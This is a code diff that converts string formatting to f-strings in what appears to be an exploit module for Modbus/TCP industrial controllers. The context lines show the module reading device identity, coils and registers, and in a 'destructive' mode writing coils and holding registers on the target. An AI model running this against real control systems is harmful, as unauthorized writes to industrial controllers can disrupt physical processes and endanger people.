@@ -50,7 +50,7 @@ def _parse_mei_response(data: bytes) -> dict:
             oid  = data[offset]
             olen = data[offset + 1]
             oval = data[offset + 2: offset + 2 + olen].decode("ascii", errors="replace")
-            result[obj_labels.get(oid, "Obj_0x{:02X}".format(oid))] = oval
+            result[obj_labels.get(oid, f"Obj_0x{oid:02X}")] = oval
             offset += 2 + olen
     except Exception:
         pass
@@ -98,9 +98,9 @@ class Exploit(ModbusBaseExploit):
         sim   = getattr(self, "_simulate_mode", self.simulate)
         destr = getattr(self, "_destructive_mode", self.destructive)
 
-        print_info("  Target  : {}".format(self.target))
+        print_info(f"  Target  : {self.target}")
         print_info("  Port(s) : {}".format(", ".join(str(p) for p in ports)))
-        print_info("  Unit ID : {}".format(self.unit_id))
+        print_info(f"  Unit ID : {self.unit_id}")
         print_info("  Mode    : {}".format(
             "[SIMULATE] check + synthetic output" if sim else
             ("[READ+WRITE / DESTRUCTIVE]" if destr else "[READ] real reads, writes blocked")
@@ -115,9 +115,7 @@ class Exploit(ModbusBaseExploit):
                 try:
                     s = _socket.create_connection((self.target, port), timeout=timing.socket_timeout)
                     s.close()
-                    print_success("  [SIMULATE] {}:{} OPEN -- Modbus/TCP device present".format(
-                        self.target, port
-                    ))
+                    print_success(f"  [SIMULATE] {self.target}:{port} OPEN -- Modbus/TCP device present")
                     print_info("")
                     print_info("  [SIMULATE] If VULNERABLE, real reads would return:")
                     print_info("    FC43 VendorName   : [Simulated] Schneider Electric")
@@ -128,33 +126,25 @@ class Exploit(ModbusBaseExploit):
                     if fc in (3, 4):
                         label = "Holding" if fc == 3 else "Input"
                         regs = [random.randint(0, 65535) for _ in range(min(qty, 10))]
-                        print_info("    FC{:02d} {} Registers (addr {}-{}):".format(
-                            fc, label, start, start + len(regs) - 1
-                        ))
+                        print_info(f"    FC{fc:02d} {label} Registers (addr {start}-{start + len(regs) - 1}):")
                         for i, v in enumerate(regs):
-                            print_info("      addr {:5d}: {:6d}  (0x{:04X})  [SIMULATED]".format(
-                                start + i, v, v
-                            ))
+                            print_info(f"      addr {start + i:5d}: {v:6d}  (0x{v:04X})  [SIMULATED]")
                     elif fc in (1, 2):
                         label = "Coils" if fc == 1 else "Discrete Inputs"
                         bits = "".join(str(random.randint(0, 1)) for _ in range(min(qty, 16)))
-                        print_info("    FC{:02d} {} (addr {}-{}): {}  [SIMULATED]".format(
-                            fc, label, start, start + qty - 1, bits
-                        ))
+                        print_info(f"    FC{fc:02d} {label} (addr {start}-{start + qty - 1}): {bits}  [SIMULATED]")
                     print_info("")
                     print_warning("  To read REAL values: set SIMULATE false && run")
                 except Exception:
-                    print_info("  [SIMULATE] {}:{} no response (closed or filtered)".format(
-                        self.target, port
-                    ))
+                    print_info(f"  [SIMULATE] {self.target}:{port} no response (closed or filtered)")
             return
 
         # ── MODE 2: READ (real reads) and MODE 3: DESTRUCTIVE (read+write) ──
         for port in ports:
-            print_status("Connecting {}:{} ...".format(self.target, port))
+            print_status(f"Connecting {self.target}:{port} ...")
             with ModbusTCPSocket(self.target, port, self.unit_id, timing) as sock:
                 if not sock._sock:
-                    print_error("  Cannot connect to {}:{}".format(self.target, port))
+                    print_error(f"  Cannot connect to {self.target}:{port}")
                     continue
 
                 # FC43/MEI Device Identification (always)
@@ -163,10 +153,10 @@ class Exploit(ModbusBaseExploit):
                     info = _parse_mei_response(mei_resp)
                     print_success("  FC43 Device Identification:")
                     for k, v in info.items():
-                        print_info("    {:25s}: {}".format(k, v))
+                        print_info(f"    {k:25s}: {v}")
                 elif mei_resp and len(mei_resp) > 7 and mei_resp[7] & 0x80:
                     exc = mei_resp[8] if len(mei_resp) > 8 else "?"
-                    print_status("  FC43 exception {} -- device present, MEI not supported".format(exc))
+                    print_status(f"  FC43 exception {exc} -- device present, MEI not supported")
                 else:
                     print_status("  FC43 no response")
 
@@ -175,7 +165,7 @@ class Exploit(ModbusBaseExploit):
                 if sid_resp and len(sid_resp) > 8 and sid_resp[7] == 0x11:
                     decoded = sid_resp[9:].decode("ascii", errors="replace").strip("\x00")
                     if decoded:
-                        print_success("  FC17 Server ID: {}".format(decoded))
+                        print_success(f"  FC17 Server ID: {decoded}")
 
                 # FC reads for selected addresses
                 start, qty = addresses.as_bulk()
@@ -206,36 +196,30 @@ class Exploit(ModbusBaseExploit):
                                         addr_obj.offset, "ON" if val_bool else "OFF"
                                     ))
                                 else:
-                                    print_warning("    FC05 Write coil addr {:5d} -> REJECTED (code=0x{:02X})".format(
-                                        addr_obj.offset, code & 0xFF
-                                    ))
+                                    print_warning(f"    FC05 Write coil addr {addr_obj.offset:5d} -> REJECTED (code=0x{code & 0xFF:02X})")
                             else:
                                 # FC6: Write Single Register
                                 r = sock.write_single_register(addr_obj.offset, wv)
                                 code = r[7] if r and len(r) > 7 else -1
                                 if code == 0x06:
-                                    print_success("    FC06 Write reg  addr {:5d} -> {} (0x{:04X})".format(
-                                        addr_obj.offset, wv, wv
-                                    ))
+                                    print_success(f"    FC06 Write reg  addr {addr_obj.offset:5d} -> {wv} (0x{wv:04X})")
                                 else:
-                                    print_warning("    FC06 Write reg  addr {:5d} -> REJECTED (code=0x{:02X})".format(
-                                        addr_obj.offset, code & 0xFF
-                                    ))
+                                    print_warning(f"    FC06 Write reg  addr {addr_obj.offset:5d} -> REJECTED (code=0x{code & 0xFF:02X})")
 
     def _print_fc_result(self, resp, fc, addresses, start):
         if not resp or len(resp) < 9:
-            print_info("  FC{:02d}: no response".format(fc))
+            print_info(f"  FC{fc:02d}: no response")
             return
         resp_fc = resp[7]
         if resp_fc & 0x80:
             exc = resp[8] if len(resp) > 8 else "?"
-            print_info("  FC{:02d}: exception {} (device denied)".format(fc, exc))
+            print_info(f"  FC{fc:02d}: exception {exc} (device denied)")
             return
         payload = resp[9:]
         if fc in (1, 2):
             bits = ""
             for byte in payload:
-                bits += "{:08b}".format(byte)[::-1]
+                bits += f"{byte:08b}"[::-1]
             print_success("  FC{:02d} ({}) -- {} values:".format(
                 fc, "Coils" if fc == 1 else "Discrete Inputs", len(addresses)
             ))
@@ -248,12 +232,12 @@ class Exploit(ModbusBaseExploit):
             for i in range(0, len(payload) - 1, 2):
                 regs.append(struct.unpack(">H", payload[i: i + 2])[0])
             label = "Holding" if fc == 3 else "Input"
-            print_success("  FC{:02d} ({} Registers) -- {} values:".format(fc, label, len(regs)))
+            print_success(f"  FC{fc:02d} ({label} Registers) -- {len(regs)} values:")
             for a in addresses:
                 idx = a.offset - start
                 if idx < len(regs):
                     v = regs[idx]
-                    print_info("    addr {:5d}: {:6d}  (0x{:04X})".format(a.offset, v, v))
+                    print_info(f"    addr {a.offset:5d}: {v:6d}  (0x{v:04X})")
 
     @mute
     def check(self) -> bool:
